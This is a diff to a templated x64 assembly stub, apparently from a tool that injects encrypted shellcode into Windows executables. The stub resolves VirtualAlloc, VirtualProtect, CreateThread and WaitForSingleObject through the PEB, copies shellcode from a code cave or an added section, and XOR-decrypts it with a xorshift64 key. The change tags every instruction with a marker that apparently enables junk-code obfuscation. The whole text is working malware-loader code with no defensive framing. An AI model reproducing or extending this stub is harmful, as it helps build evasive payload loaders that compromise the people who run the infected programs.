@@ -200,34 +200,34 @@ entry:
 
 {{else}}
   // get pointer to the PEB
-  xor {{.Reg.rax}}, {{.Reg.rax}}
-  mov {{.Reg.rax}}, 0x60
-  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
+  xor {{.Reg.rax}}, {{.Reg.rax}}                               {{igi}}
+  mov {{.Reg.rax}}, 0x60                                       {{igi}}
+  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]                          {{igi}}
   // store image base address
-  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]
+  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]                     {{igi}}
   // get procedure address of VirtualAlloc
-  mov {{.RegV.rcx}}, {{.RegN.rdi}}
-  add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
-  mov {{.RegV.rcx}}, [{{.RegV.rcx}}]
-  mov [rsp+0x10], {{.RegV.rcx}}
+  mov {{.RegV.rcx}}, {{.RegN.rdi}}                             {{igi}}
+  add {{.RegV.rcx}}, {{hex .VirtualAlloc}}                     {{igi}}
+  mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                           {{igi}}
+  mov [rsp+0x10], {{.RegV.rcx}}                                {{igi}}
   // get procedure address of VirtualProtect
-  mov {{.RegV.rdx}}, {{.RegN.rdi}}
-  add {{.RegV.rdx}}, {{hex .VirtualProtect}}
-  mov {{.RegV.rdx}}, [{{.RegV.rdx}}]
-  mov [rsp+0x20], {{.RegV.rdx}}
+  mov {{.RegV.rdx}}, {{.RegN.rdi}}                             {{igi}}
+  add {{.RegV.rdx}}, {{hex .VirtualProtect}}                   {{igi}}
+  mov {{.RegV.rdx}}, [{{.RegV.rdx}}]                           {{igi}}
+  mov [rsp+0x20], {{.RegV.rdx}}                                {{igi}}
   // get procedure address of CreateThread
   {{if .NeedCreateThread}}
-    mov {{.RegV.r8}}, {{.RegN.rdi}}
-    add {{.RegV.r8}}, {{hex .CreateThread}}
-    mov {{.RegV.r8}}, [{{.RegV.r8}}]
-    mov [rsp+0x28], {{.RegV.r8}}
+    mov {{.RegV.r8}}, {{.RegN.rdi}}                            {{igi}}
+    add {{.RegV.r8}}, {{hex .CreateThread}}                    {{igi}}
+    mov {{.RegV.r8}}, [{{.RegV.r8}}]                           {{igi}}
+    mov [rsp+0x28], {{.RegV.r8}}                               {{igi}}
   {{end}}
   // get procedure address of WaitForSingleObject
   {{if .NeedWaitThread}}
-    mov {{.RegV.r9}}, {{.RegN.rdi}}
-    add {{.RegV.r9}}, {{hex .WaitForSingleObject}}
-    mov {{.RegV.r9}}, [{{.RegV.r9}}]
-    mov [rsp+0x30], {{.RegV.r9}}
+    mov {{.RegV.r9}}, {{.RegN.rdi}}                            {{igi}}
+    add {{.RegV.r9}}, {{hex .WaitForSingleObject}}             {{igi}}
+    mov {{.RegV.r9}}, [{{.RegV.r9}}]                           {{igi}}
+    mov [rsp+0x30], {{.RegV.r9}}                               {{igi}}
   {{end}}
 {{end}} // LackProcedure
 
@@ -284,49 +284,49 @@ entry:
 
 {{if .CodeCave}}
   // extract encrypted shellcode from code cave
-  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
-  mov {{.RegN.rdi}}, [rsp+0x08]
-  add {{.RegN.rdi}}, {{hex .EntryOffset}}
+  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}                     {{igi}}
+  mov {{.RegN.rdi}}, [rsp+0x08]                                {{igi}}
+  add {{.RegN.rdi}}, {{hex .EntryOffset}}                      {{igi}}
   {{STUB CodeCaveMode STUB}}
 {{end}} // CodeCave
 
 {{if or .ExtendSection .CreateSection}}
   // save rsi and rdi
-  push rsi
-  push rdi
+  push rsi                                                     {{igi}}
+  push rdi                                                     {{igi}}
 
   // extract encrypted shellcode from section
-  mov rsi, {{.RegN.rdi}}
-  add rsi, {{hex .ShellcodeOffset}}
-  mov rdi, [rsp+0x18]
-  add rdi, {{hex .EntryOffset}}
-  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
+  mov rsi, {{.RegN.rdi}}                                       {{igi}}
+  add rsi, {{hex .ShellcodeOffset}}                            {{igi}}
+  mov rdi, [rsp+0x18]                                          {{igi}}
+  add rdi, {{hex .EntryOffset}}                                {{igi}}
+  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}                    {{igi}}
  loop_extract:
-  movsb
-  inc rsi
+  movsb                                                        {{igi}}
+  inc rsi                                                      {{igi}}
   // check extract shellcode is finish
-  dec {{.RegV.rcx}}
-  jnz loop_extract
+  dec {{.RegV.rcx}}                                            {{igi}}
+  jnz loop_extract                                             {{igi}}
 
   // restore rdi and rsi
-  pop rdi
-  pop rsi
+  pop rdi                                                      {{igi}}
+  pop rsi                                                      {{igi}}
 
   // decrypt shellcode in the memory page
-  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}
-  mov {{.RegV.rdx}}, [rsp+0x08]
-  add {{.RegV.rdx}}, {{hex .EntryOffset}}
-  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
+  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}                     {{igi}}
+  mov {{.RegV.rdx}}, [rsp+0x08]                                {{igi}}
+  add {{.RegV.rdx}}, {{hex .EntryOffset}}                      {{igi}}
+  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}                    {{igi}}
  loop_decrypt:
-  mov {{.RegV.r8}}, [{{.RegV.rdx}}]
-  xor {{.RegV.r8}}, {{.RegV.rax}}
-  mov [{{.RegV.rdx}}], {{.RegV.r8}}
+  mov {{.RegV.r8}}, [{{.RegV.rdx}}]                            {{igi}}
+  xor {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
+  mov [{{.RegV.rdx}}], {{.RegV.r8}}                            {{igi}}
   // update the key with xorshift64
-  call xor_shift
+  call xor_shift                                               {{igi}}
   // check decrypt shellcode is finish
-  add {{.RegV.rdx}}, 8
-  sub {{.RegV.rcx}}, 8
-  jnz loop_decrypt
+  add {{.RegV.rdx}}, 8                                         {{igi}}
+  sub {{.RegV.rcx}}, 8                                         {{igi}}
+  jnz loop_decrypt                                             {{igi}}
 {{end}} // SectionMode
 
 // ================================== execute shellcode ==================================
